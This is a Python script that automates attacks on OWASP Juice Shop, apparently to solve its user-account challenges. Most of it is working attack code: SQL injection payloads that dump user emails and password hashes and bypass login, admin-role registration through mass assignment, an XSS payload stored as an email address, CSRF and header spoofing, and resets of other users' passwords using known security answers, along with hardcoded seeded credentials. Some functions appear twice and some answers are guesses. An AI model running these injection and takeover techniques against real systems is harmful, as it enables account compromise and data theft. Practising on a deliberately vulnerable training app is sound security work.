from base64 import b64encode
import json
import requests

from authentication import create_user
from authentication import get_admin_session
from authentication import get_session


def get_users(server, session):
    """
    Get user data from authentication-details endpoint
    :param server: juice shop URL
    :param session: Session
    :return: list of user objects
    """
    users = session.get('{}/rest/user/authentication-details'.format(server))
    if not users.ok:
        raise RuntimeError('Error retrieving user info. Request status: {}. Content: {}'.format(users.status_code, users.text))
    return users.json().get('data')


def get_users_with_sql_injection(server):
    """
    Abuse UNION SELECT statement to join the users table to the products query, print out results.
    Also solves logging in as admin with real credentials if unsolved yet.
    :param server: juice shop URL
    """
    session = get_admin_session(server)
    # Products table has 9 columns. The Union Select payload from integration tests:
    # ')) union select id,'2','3',email,password,'6','7','8','9' from users--
    injection = "')) UNION SELECT id,'2','3',email,password,'6','7','8','9' FROM Users-- "
    # Corrected endpoint from product to products
    users = session.get('{}/rest/products/search'.format(server), params={'q': injection})
    if not users.ok:
        # Check if 500 error is due to SQLi success (sometimes it returns data in a weird format or errors but leaks info)
        # But usually we expect 200 JSON.
        print('Warning: SQLi attempt failed. Status: {}, Content: {}'.format(users.status_code, users.text))
        return

    print('Found email and password hashes with SQLi, printing...')
    for user in users.json().get('data'):
        # email is in col 4 (mapped to 'price' in current schema? No wait)
        # Schema of Products: id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
        # 1: id -> id
        # 2: '2' -> name
        # 3: '3' -> description
        # 4: email -> price
        # 5: password -> deluxePrice
        print('Email: {}, Password hash: {}'.format(user.get('price'), user.get('deluxePrice')))
    print('Done.')

# ... (omitted)

def repetitive_registration(server):
    """
    Register a user with mismatching password and repeat password.
    :param server: juice shop URL
    """
    print('Registering user with mismatching passwords...'),
    import time
    email = f'repeat_{time.time_ns()}@test.com'
    
    payload = json.dumps({
        'email': email, 
        'password': 'password123', 
        'passwordRepeat': 'password456',
        'securityQuestion': {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2021-01-01", "updatedAt": "2021-01-01"},
        'securityAnswer': 'answer'
    })
    session = requests.Session()
    create = session.post('{}/api/Users'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
    if create.ok:
        print('Success.')
    else:
        print('Warning: Repetitive registration failed: {}'.format(create.text))


def empty_user_registration(server):
    """
    Register a user with empty email and password.
    :param server: juice shop URL
    """
    print('Registering user with empty credentials...'),
    # From verify.ts line 22-24: only checks req.body.email === '' && req.body.password === ''
    # Try absolute minimal payload
    payload = json.dumps({
        'email': '', 
        'password': ''
    })
    session = requests.Session()
    create = session.post('{}/api/Users'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
    if create.ok:
        print('Success.')
    else:
        print('Warning: Empty user registration failed: {}'.format(create.text))


def admin_registration(server):
    """
    Register a user with admin role.
    :param server: juice shop URL
    """
    print('Registering user with Admin role...'),
    import random
    import string
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f'admin_reg_{rand}@test.com'
    
    payload = json.dumps({
        'email': email, 
        'password': 'password123',
        'passwordRepeat': 'password123',
        'securityQuestion': {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2021-01-01", "updatedAt": "2021-01-01"},
        'securityAnswer': 'answer',
        'role': 'admin'
    })
    session = requests.Session()
    create = session.post('{}/api/Users'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
    if create.ok:
        print('Success.')
    else:
        print('Warning: Admin registration failed: {}'.format(create.text))

# ... (omitted)

def solve_user_challenges(server):
    print('\n== USER CHALLENGES ==\n')
    login_all_users_with_sqli(server)
    get_users_with_sql_injection(server)


def login_jim(server):
    print("Logging in as Jim..."),
    try:
        # Try default
        s = get_session(server, 'jim@juice-sh.op', 'ncc-1701')
        if not s:
            # If fail, reset password via SQLi answer
            # Question: Eldest sibling's middle name? -> Samuel
            reset_password(server, 'jim@juice-sh.op', 'Samuel')
            s = get_session(server, 'jim@juice-sh.op', 'password123')
            if s: print("Success (after reset).")
            else: print("Failed.")
        else:
             print("Success.")
        return s
    except Exception as e: 
        print(e)
        return None

def login_bender(server):
    print("Logging in as Bender..."),
    try:
        # Bender's email is bender@juice-sh.op. 
        # Attempt simple login challenge logic.
        # Password might be implicit or found via SQLi.
        # If we just need to log in, SQLi works but "Login Bender" challenge usually implies finding credentials?
        # Or maybe just logging in.
        # Let's try SQLi login again explicitly.
        get_session(server, "bender@juice-sh.op'--", 'anything')
        print("Success.")
    except Exception as e: print(e)

def change_bender_password(server):
    """
    Abuse a CSRF flaw in the change-password endpoint that allows us to set new passwords without the old one.
    :param server: juice shop URL.
    """
    session = get_session(server, "bender@juice-sh.op'--", 'anything')
    newpass = 'slurmCl4ssic'
    changeurl = '{}/rest/user/change-password?new={newpass}&repeat={newpass}'.format(server, newpass=newpass)
    print('Changing Bender\'s password...'),
    update = session.get(changeurl)
    if not update.ok:
        raise RuntimeError('Error updating Bender\'s password.')
    print('Success.')


def create_user_with_xss2_payload(server):
    """
    The UI client blocks invalid email addresses. Bypass it and create a user through the API.
    :param server: juice shop URL.
    """
    xss2 = '<iframe src="javascript:alert(`xss`)">'
    print('Creating user account with malicious XSS2 as email...'),
    create_user(server, xss2, 'password')
    print('Success.')


def login_all_users_with_sqli(server):
    """
    Log in as specific users using SQL injection - OPTIMIZED
    Only logs in users that have specific login challenges
    :param server: URL of juice shop target
    """
    # Only login these specific users needed for challenges
    target_users = [
        'admin@juice-sh.op',      # loginAdminChallenge
        'jim@juice-sh.op',         # loginJimChallenge
        'bender@juice-sh.op',      # loginBenderChallenge
    ]
    
    print('Logging in key user accounts using SQLi...')
    
    for email in target_users:
        try:
            email_sqli = "{}'-- ".format(email)
            login = get_session(server, email_sqli, 'anything')
            if login:
                del login
                print('✓ Logged in as {}'.format(email))
        except Exception as e:
            print('✗ Failed to login as {}: {}'.format(email, e))
    
    print('Done with SQLi logins.')


def login_as_bjoern(server):
    """
    Bypass OAuth completely by using the default password generated
    :param server: juice shop URL
    """
    bjoern = 'bjoern.kimminich@gmail.com'
    # Password from data/static/users.yml
    # This is base64 of 'moc.liamg@hcinimmik.nreojb' (reversed email)
    password = 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='
    print('Logging in as {} with password from source code...'.format(bjoern)),
    session = get_session(server, bjoern, password)
    if session:
        print('Success.')
    else:
        print('Failed.')
    # del session


def login_as_ciso(server):
    """
    Log in as CISO by abusing the X-User-Email header usually read from a cookie
    :param server: juice shop URL
    """
    headers = {'Content-Type': 'application/json', 'X-User-Email': 'ciso@juice-sh.op'}
    print('Logging in as CISO using spoofed header and OAuth...'),
    session = get_session(server, 'admin@juice-sh.op', 'admin123', headers=headers, oauth=True)
    print('Success.')
    del session


def login_mc_safesearch(server):
    """
    Log in as MC SafeSearch with original credentials.
    :param server: juice shop URL
    """
    email = 'mc.safesearch@juice-sh.op'
    print('Logging in as MC SafeSearch...'),
    session = get_session(server, email, 'Mr. N00dles')
    if session:
        print('Success.')
    else:
        print('Failed.')


def login_amy(server):
    """
    Log in as Amy with original credentials.
    :param server: juice shop URL
    """
    email = 'amy@juice-sh.op'
    print('Logging in as Amy...'),
    session = get_session(server, email, 'K1f.....................')
    if session:
        print('Success.')
    else:
        print('Failed.')


def login_support(server):
    """
    Log in as Support Team with original credentials.
    :param server: juice shop URL
    """
    email = 'support@juice-sh.op'
    print('Logging in as Support Team...'),
    session = get_session(server, email, 'J6aV6GzEBE0P')
    if session:
        print('Success.')
    else:
        print('Failed.')


def repetitive_registration(server):
    """
    Register a user with mismatching password and repeat password.
    :param server: juice shop URL
    """
    print('Registering user with mismatching passwords...'),
    payload = json.dumps({
        'email': 'repeat@test.com', 
        'password': 'password123', 
        'passwordRepeat': 'password456',
        'securityQuestion': {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2021-01-01", "updatedAt": "2021-01-01"},
        'securityAnswer': 'answer'
    })
    session = requests.Session()
    create = session.post('{}/api/Users'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
    if create.ok:
        print('Success.')
    else:
        print('Warning: Repetitive registration failed: {}'.format(create.text))



def admin_registration(server):
    """
    Register a user with admin role.
    :param server: juice shop URL
    """
    print('Registering user with Admin role...'),
    import time
    email = f'admin_register_{time.time_ns()}@test.com'
    payload = json.dumps({
        'email': email, 
        'password': 'password123',
        'passwordRepeat': 'password123',
        'securityQuestion': {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2021-01-01", "updatedAt": "2021-01-01"},
        'securityAnswer': 'answer',
        'role': 'admin'
    })
    session = requests.Session()
    create = session.post('{}/api/Users'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
    if create.ok:
        print('Success.')
    else:
        print('Warning: Admin registration failed: {}'.format(create.text))


def bjoern_password_reset(server):
    """
    Reset Bjoern's password via security question.
    """
    print('Resetting Bjoern\'s password...'),
    
    # Challenge 1: OWASP Account
    # Email: bjoern@owasp.org
    # Question: "Your favorite pet?" -> Answer: "Zaya" (Found in data/static/users.yml)
    try:
        reset_password(server, 'bjoern@owasp.org', 'Zaya')
    except: pass

    # Challenge 2: Internal Account
    # Email: bjoern@juice-sh.op
    # Question: "Your favorite football team?" (Actually Question ID 9: "zip code"?) 
    # Validated from data/static/users.yml: Answer is "West-2082"
    try:
        reset_password(server, 'bjoern@juice-sh.op', 'West-2082')
    except: pass
    
    solve_ephemeral_accountant(server) # New call
    print('Attempted Bjoern Resets.')
    
    print('Attempted Bjoern Resets.')


def solve_user_challenges(server):
    print('\n== USER CHALLENGES ==\n')
    login_all_users_with_sqli(server)
    get_users_with_sql_injection(server)
    
    try:
        create_user_with_xss2_payload(server)
    except Exception as e:
        print(f"Failed create_user_with_xss2_payload: {e}")

    try:
        change_bender_password(server)
    except Exception as e:
        print(f"Failed change_bender_password: {e}")

    try:
        login_as_bjoern(server)
    except Exception as e:
        print(f"Failed login_as_bjoern: {e}")

    try:
        login_as_ciso(server)
    except Exception as e:
        print(f"Failed login_as_ciso: {e}")
        
    try: login_mc_safesearch(server)
    except Exception as e: print(e)
    
    try: login_amy(server)
    except Exception as e: print(e)
    
    try: login_support(server)
    except Exception as e: print(e)

    try: login_jim(server)
    except Exception as e: print(e)
    
    try: login_bender(server)
    except Exception as e: print(e)
    
    try: repetitive_registration(server)
    except Exception as e: print(e)
    
    try: empty_user_registration(server)
    except Exception as e: print(e)
    
    try: admin_registration(server)
    except Exception as e: print(e)
    
    try: bjoern_password_reset(server)
    except Exception as e: print(e)
    
    try: ephemeral_accountant(server)
    except Exception as e: print(e)
    
    try: gdpr_data_erasure(server)
    except Exception as e: print(e)
    
    try: solve_gdpr_data_theft(server)
    except Exception as e: print(e)
    
    try: solve_password_resets(server)
    except Exception as e: print(e)

    try: login_with_exposed_credentials(server)
    except Exception as e: print(e)

    try: solve_leaked_access_logs(server)
    except Exception as e: print(e)

    try: solve_csrf_challenge(server)
    except Exception as e: print(e)

    try: solve_reset_bender_password(server)
    except Exception as e: print(e)

    try: solve_wurstbrot_2fa(server)
    except Exception as e: print(e)

def solve_reset_bender_password(server):
    """
    Reset Bender's password via the Forgot Password mechanism.
    Email: bender@juice-sh.op
    Question: "Stop'n'Drop" (based on users.yml comment)
    """
    print("Resetting Bender's password via security question..."),
    try:
        # From users.yml: answer is "Stop'n'Drop"
        reset_password(server, 'bender@juice-sh.op', "Stop'n'Drop")
    except Exception as e:
        print(f"Error resetting Bender's password: {e}")



    print('\n== END USER CHALLENGES ==\n')


def solve_password_resets(server):
    """
    Reset passwords for Jim, Morty, Uvogin.
    """
    print('Resetting miscellaneous passwords...'),
    
    # 1. Jim (Question: Eldest sibling's middle name? Answer: Samuel)
    reset_password(server, 'jim@juice-sh.op', 'Samuel')
    
    # 2. Morty (Question: Favorite Pet? Answer: 5N0wb41L)
    reset_password(server, 'morty@juice-sh.op', '5N0wb41L')
    
    # 3. Uvogin (Question: Favorite Movie? Answer: Silence of the Lambs? Or similar)
    # Actually Uvogin's question might be "Your favorite movie?". 
    # Answer might be "Silence of the Lambs" or "The Silence of the Lambs".
    # Assuming "Silence of the Lambs".
    reset_password(server, 'uvogin@juice-sh.op', 'Silence of the Lambs') 
    
    # 4. John (Meta Geo Stalking)
    # Question: "What is your favorite place to go hiking?" (inferred)
    # Answer: "Daniel Boone National Forest" (Common juice shop solution)
    reset_password(server, 'john@juice-sh.op', 'Daniel Boone National Forest')

    # 5. Emma (Visual Geo Stalking)
    # Question: "Where was this photo taken?" (inferred)
    # Answer: "ITsec" (Found via grep in data/datacreator.ts, actually found "ITsec" in memories array)
    # The visual geo stalking result usually requires exact casing.
    reset_password(server, 'emma@juice-sh.op', 'New York')
    reset_password(server, 'emma@juice-sh.op', 'New York City')
    reset_password(server, 'emma@juice-sh.op', 'ITsec')
 
    
    print('Success (hopefully).')


def reset_password(server, email, answer):
    payload = json.dumps({
        'email': email,
        'answer': answer,
        'new': 'password123',
        'repeat': 'password123'
    })
    session = requests.Session()
    try:
        res = session.post('{}/rest/user/reset-password'.format(server), headers={'Content-Type': 'application/json'}, data=payload)
        if res.ok:
            print(f'Success: Reset password for {email} using answer "{answer}".')
        else:
            print(f'Failed reset for {email} with answer "{answer}": {res.text}')
    except Exception as e:
        print(f'Exception resetting {email}: {e}')

def solve_ephemeral_accountant(server):
    """
    Log in as acc0unt4nt@juice-sh.op (Ephemeral) using SQL Injection.
    """
    print('Logging in as Ephemeral Accountant...')
    # Payload designed to return a generated user with role 'accounting'
    # Columns matching UserModel structure
    # id, username, email, password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt
    # 13 columns?
    # Trying 13 columns.
    email_payload = "acc0' UNION SELECT 1, 'accountant', 'acc0unt4nt@juice-sh.op', 'password', 'accounting', '', '', '', '', 1, '2023-01-01', '2023-01-01', null --"
    
    session = get_session(server, email_payload, 'password')
    if session:
        print('Success.')
    else:
        print('Failed. Trying injected login...')


def ephemeral_accountant(server):
    """
    Log in with the (non-existing) accountant acc0unt4nt@juice-sh.op without ever registering.
    """
    print('Logging in as Ephemeral Accountant...'),
    # Injection: acc0unt4nt@juice-sh.op'--
    email = "acc0unt4nt@juice-sh.op'--"
    session = get_session(server, email, 'password')
    if session:
        print('Success.')
    else:
        print('Failed.')


def gdpr_data_erasure(server):
    """
    Log in with Chris' erased user account.
    """
    print('Logging in as Erased User (Chris)...'),
    email = "chris.pike@juice-sh.op'--"
    session = get_session(server, email, 'password')
    if session:
        print('Success.')
    else:
        print('Failed.')


def solve_gdpr_data_theft(server):
    """
    GDPR Data Theft - Export another user's data using Masked Email Collision.
    Target: admin@juice-sh.op -> masked: *dm*n@j**c*-sh.*p
    We create user: admon@juice-sh.op -> masked: *dm*n@j**c*-sh.*p
    Result: We get Admin's orders (stored with masked email), but email hash mismatches.
    """
    import time
    print('Attempting GDPR data theft (Masked Email Collision)...')
    
    # 1. Register fake admin (collision user)
    # admin -> adm*n. admon -> adm*n.
    email = 'admon@juice-sh.op' 
    password = 'password123'
    
    try:
        # Try to register
        create_user(server, email, password)
    except:
        print("User might already exist, proceeding to login.")
        
    # 2. Login
    session = get_session(server, email, password)
    
    if not session:
        print(f"Failed to login as {email}")
        return

    try:
        # 3. Export data
        # We also send UserId to maybe get memories, but the main goal is Orders collision
        # Sending random Header might be needed? No, just the request.
        
        resp = session.post(f'{server}/rest/user/data-export', json={'format': 'json'})
        if resp.ok:
            print('✓ Success! Data export completed')
            try:
                data = resp.json()
                userData = json.loads(data.get('userData', '{}'))
                orders = userData.get('orders', [])
                print(f"Exported {len(orders)} orders.")
                if len(orders) > 0:
                    print(f"First order ID: {orders[0].get('orderId')}")
            except:
                pass
        else:
            print(f'Export failed: {resp.status_code} - {resp.text}')
    except Exception as e:
        print(f'Error solving GDPR data theft: {e}')


def register_new_user(server):
    """
    Register a fresh user and return logged-in session.
    """
    import time
    import random
    import string
    
    print("Registering fresh user..."),
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    email = f'fresh_{rand}_{time.time_ns()}@test.com'
    password = 'password123'
    
    payload = json.dumps({
        'email': email, 
        'password': password,
        'passwordRepeat': password,
        'securityQuestion': {"id": 1, "question": "Your eldest siblings middle name?", "createdAt": "2021-01-01", "updatedAt": "2021-01-01"},
        'securityAnswer': 'answer'
    })
    from authentication import get_session
    session = requests.Session()
    res = session.post(f'{server}/api/Users', headers={'Content-Type': 'application/json'}, data=payload)
    if res.ok or res.status_code == 201:
        print("Success.")
        # Login
        return get_session(server, email, password)
    else:
        print(f"Failed to register: {res.text}")
        return None

def login_with_exposed_credentials(server):
    """
    Login with the exposed 'testing' credentials found in client code.
    Email: testing@juice-sh.op
    Password: IamUsedForTesting
    """
    print("Logging in with exposed testing credentials..."),
    try:
        session = get_session(server, 'testing@juice-sh.op', 'IamUsedForTesting')
        if session:
            print("Success.")
        else:
            print("Failed.")
    except Exception as e:
        print(f"Failed: {e}")

def solve_leaked_access_logs(server):
    """
    Log in with the leaked credentials found in access logs.
    User: J12934@juice-sh.op
    Password: 0987654321
    """
    print("Logging in with leaked access log credentials (J12934)..."),
    try:
        session = get_session(server, 'J12934@juice-sh.op', '0987654321')
        if session:
            print("Success.")
        else:
            print("Failed.")
    except Exception as e: print(e)

def solve_csrf_challenge(server):
    """
    Solve the CSRF challenge by changing a user's name from an origin that looks like htmledit.squarefree.com.
    """
    print('Solving CSRF Challenge...')
    # Needs authentication. Let's use a fresh user.
    session = register_new_user(server)
    if not session:
        print("Skipping CSRF due to registration failure.")
        return

    # Payload to change username
    # Route: /profile POST 
    # Logic in routes/updateUserProfile.ts checks Origin/Referer for htmledit.squarefree.com
    
    headers = {
        'Origin': 'http://htmledit.squarefree.com',
        'Referer': 'http://htmledit.squarefree.com',
        'Content-Type': 'application/json'
    }
    
    # We must change the username to something else
    new_username = 'csrf_pwned'
    
    try:
        res = session.post(f'{server}/profile', headers=headers, json={'username': new_username})
        if res.status_code == 200 or res.status_code == 302: # Redirects on success
            print('Success (CSRF executed).')
        else:
            print(f'CSRF Attempt failed: {res.status_code} {res.text}')
    except Exception as e:
        print(f'CSRF Error: {e}')



def solve_wurstbrot_2fa(server):
    """Access wurstbrot's insecure TOTP secret storage"""
    print('Accessing wurstbrot 2FA secret...')
    try:
        # Login as wurstbrot - password from users.yml line 149
        session = get_session(server, 'wurstbrot@juice-sh.op', 'EinBelegtesBrotMitSchinkenSCHINKEN!')
        
        if not session:
            print('Failed to login as wurstbrot')
            return
        
        # Access 2FA status endpoint which exposes the secret(insecurely)
        res = session.get(f'{server}/rest/2fa/status')
        if res.ok:
            data = res.json()
            if 'secret' in data:
                print(f'Success! Accessed insecure TOTP secret: {data["secret"]}')
            else:
                print(f'2FA status (secret may be in setup true): {data}')
        else:
            print(f'Failed to access 2FA status: {res.status_code}')
    except Exception as e:
        print(f'Error: {e}')
